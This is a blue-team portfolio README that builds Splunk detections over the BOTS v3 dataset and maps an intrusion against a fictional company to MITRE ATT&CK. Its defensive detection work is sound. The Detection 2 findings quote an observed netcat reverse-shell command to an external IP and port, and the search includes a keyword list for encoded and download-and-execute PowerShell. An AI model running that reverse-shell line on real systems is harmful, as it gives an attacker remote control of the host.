# SOC Detection Dashboard — Splunk + BOTS v3

A blue-team detection engineering project built in **Splunk Enterprise** using the
**Boss of the SOC (BOTS) v3** dataset. The dashboard ingests realistic security
telemetry and surfaces four detections that together reconstruct an entire intrusion —
from initial access through to command-and-control — and maps each detection to the
**MITRE ATT&CK** framework.

---

## Overview

| | |
|---|---|
| **Platform** | Splunk Enterprise (Dashboard Studio, Grid layout) |
| **Dataset** | [Splunk BOTS v3](https://github.com/splunk/botsv3) — ~2.08M pre-indexed events |
| **Data sources used** | Azure AD sign-in logs, Sysmon process creation, network stream (TCP/IP) |
| **Detections** | 4 (auth brute force, malicious PowerShell, masquerading, C2 / outbound) |
| **Frameworks** | MITRE ATT&CK |

The scenario in BOTS v3 centres on the fictional company **Frothly** (`froth.ly`). The
detections below trace the attacker through the network on the night of
**20–21 August 2018**.

---

## The Attack, as a Kill Chain

The four detections aren't isolated — they correspond to consecutive stages of a single
intrusion. Reading them together tells the story:

```
1. Initial Access   →  Brute force / password spraying against Azure AD
2. Execution        →  Malicious encoded PowerShell + masquerading binary
3. Command & Control→  Reverse shell + outbound traffic to attacker IP
4. Impact           →  High-volume outbound (exfil / resource hijacking)
```

A key piece of analysis: the attacker IP **45.77.53.176** and port **8088** were
identified independently in *both* the process logs (Detection 2) and the network logs
(Detection 4) — a cross-source correlation that confirms the command-and-control channel
from two angles.

---

## Detection 1 — Brute Force / Password Spraying (Azure AD)

**Goal:** Identify source IPs making abnormal numbers of failed logins, or touching
multiple distinct user accounts (the signature of password spraying).

**Data source:** `ms:aad:signin` (Azure Active Directory sign-in logs)

**SPL:**
```spl
index=botsv3 sourcetype=ms:aad:signin earliest=0
| stats count AS attempts,
        sum(eval(if(loginStatus="Failure", 1, 0))) AS failures,
        dc(userPrincipalName) AS distinct_users,
        values(userPrincipalName) AS users
  by ipAddress
| where failures >= 3 OR distinct_users >= 2
| sort - failures
| table ipAddress attempts failures distinct_users users
```

**Logic:** Rather than relying on failure count alone, the detection also counts the
number of *distinct accounts* each source IP targets (`dc(userPrincipalName)`). One IP
hitting many accounts is a strong spraying indicator even when failures are low.

**Findings:**

| Source IP | Attempts | Failures | Distinct Users | Note |
|---|---|---|---|---|
| `199.66.91.253` | 51 | 5 | 2 | Primary attacker — heavy attempts against two accounts |
| `157.97.121.132` | 8 | 3 | 2 | Secondary suspect |
| `104.207.83.63` | 27 | 0 | 2 | Zero failures but two accounts → possible *successful* spraying |

**MITRE ATT&CK:**
- **T1110** — Brute Force
- **T1110.003** — Password Spraying

---

## Detection 2 — Suspicious PowerShell & Masquerading (Sysmon)

**Goal:** Catch process-creation events that show obfuscated/encoded PowerShell, or
binaries masquerading as legitimate software.

**Data source:** `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational` (EventID 1 — process creation)

> **Note:** The Sysmon add-on was not installed, so the raw events are unparsed XML.
> Fields are extracted at search time with `rex` rather than relying on indexed fields.

**SPL:**
```spl
index=botsv3 sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" earliest=0 "EventID>1<"
| rex field=_raw "Name='Image'>(?<Image>[^<]+)<"
| rex field=_raw "Name='CommandLine'>(?<CommandLine>[^<]+)<"
| rex field=_raw "Name='User'>(?<User>[^<]+)<"
| search CommandLine="*-enc*" OR CommandLine="*-nop*" OR CommandLine="*hidden*"
      OR CommandLine="*DownloadString*" OR CommandLine="*IEX*" OR CommandLine="*Invoke-Expression*"
| stats count BY host, User, Image, CommandLine
| sort - count
| table host User Image CommandLine count
```

**Findings:**

- **Encoded PowerShell** on host `BSTOLL-L` (user `AzureAD\BudStoll`):
  `powershell.exe -noP -sta -w 1 -enc <base64>` — no profile, hidden window, Base64-encoded
  payload. Classic obfuscation to hide intent from defenders.
- **Registry-based PowerShell** (user `FyodorMalteskesko`):
  `-NoP -NonI -W Hidden -c $x=$((gp HKCU:Software\...` — reading from the registry.
- **Masquerading binary:** `iexeplorer.exe` running from
  `C:\Windows\Temp\unziped\lsof-master\` — a renamed executable posing as Internet Explorer
  (the real binary is `iexplore.exe` in Program Files), beaconing to `192.168.9.30:8080`.
- **Reverse shell** observed in the command line:
  `/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe` — netcat piping a shell
  to an external host via a named pipe.

**MITRE ATT&CK:**
- **T1059.001** — Command and Scripting Interpreter: PowerShell
- **T1027** — Obfuscated Files or Information (encoded command)
- **T1036** — Masquerading (renamed binary in a temp directory)

---

## Detection 3 — Authentication Timeline (Visualization)

**Goal:** Plot login successes vs failures over time so the brute-force burst is visible
at a glance.

**Data source:** `ms:aad:signin`

**SPL:**
```spl
index=botsv3 sourcetype=ms:aad:signin earliest=0
| timechart span=1h count BY loginStatus
| where Success > 0 OR Failure > 0
```

**Visualization:** Column chart (Success vs Failure per hour). The `where` clause removes
empty time buckets so the chart focuses on the active window.

**Findings:** Failures cluster at **2018-08-20 21:00** (5 failures) with smaller spikes
into the early hours of **21 August** — visually pinpointing the attack window against the
backdrop of normal login activity.

**MITRE ATT&CK:**
- Supports **T1110** (provides temporal context for the brute-force activity)

---

## Detection 4 — C2 / Outbound to Known-Bad IP (Network Stream)

**Goal:** Confirm command-and-control and identify high-volume outbound traffic to the
attacker's infrastructure, using network telemetry independent of the host logs.

**Data source:** `stream:tcp`, `stream:ip`

**SPL:**
```spl
index=botsv3 (sourcetype=stream:tcp OR sourcetype=stream:ip) earliest=0 dest_ip="45.77.53.176"
| stats count AS connections,
        sum(bytes_out) AS bytes_sent,
        values(dest_port) AS dest_ports,
        earliest(_time) AS first_seen,
        latest(_time) AS last_seen
  BY src_ip, dest_ip
| convert ctime(first_seen) ctime(last_seen)
| sort - connections
```

**Findings:** Three internal hosts communicating with attacker IP `45.77.53.176`:

| Source IP | Dest Port(s) | Connections | Bytes Sent | Interpretation |
|---|---|---|---|---|
| `192.168.70.186` | 3333, 443 | 8,371 | ~13.1 MB | High volume; port 3333 suggests cryptomining / possible exfil |
| `192.168.24.128` | 443 | 2,769 | ~489 KB | Sustained outbound over HTTPS |
| `192.168.9.30` | 8088 | 6 | ~85 KB | **Reverse shell** — matches the `nc ... 8088` command from Detection 2 |

**Cross-source correlation:** `192.168.9.30` → `45.77.53.176:8088` appears in *both* the
Sysmon command line and the network stream, confirming the C2 channel from two
independent data sources.

**MITRE ATT&CK:**
- **T1071** — Application Layer Protocol (C2)
- **T1041** — Exfiltration Over C2 Channel
- **T1496** — Resource Hijacking (port 3333 / cryptomining indicator)

---

## How to Reproduce

1. Install **Splunk Enterprise** (free 60-day trial).
2. Download the **BOTS v3** dataset and install it via
   *Manage Apps → Install app from file* (data is pre-indexed, so it does not consume the
   license quota).
3. Restart Splunk and confirm the data loads:
   ```spl
   index=botsv3 earliest=0
   ```
   > All searches use `earliest=0` because the dataset is from 2018 and falls outside
   > Splunk's default time range.
4. Build each detection as a panel in a **Dashboard Studio** dashboard (Grid layout).

---

## Skills Demonstrated

- Writing and tuning **SPL** detections (`stats`, `timechart`, `eval`, `rex`, `convert`)
- **Search-time field extraction** from unparsed XML when an add-on isn't available
- **Threshold tuning** to fit the data and reduce false positives
- **Cross-source correlation** (host logs ↔ network logs) to confirm findings
- **MITRE ATT&CK** mapping and kill-chain reconstruction
- Building a multi-panel **Splunk dashboard** combining tables and visualizations

---

## Notes & Limitations

- Detection thresholds are tuned to this dataset's size; production thresholds would differ.
- Several BOTS v3 add-ons were intentionally skipped for simplicity, which is why
  field extraction for Sysmon is done at search time.
- This is a learning/portfolio project built against a static, pre-indexed dataset, not a
  live environment.
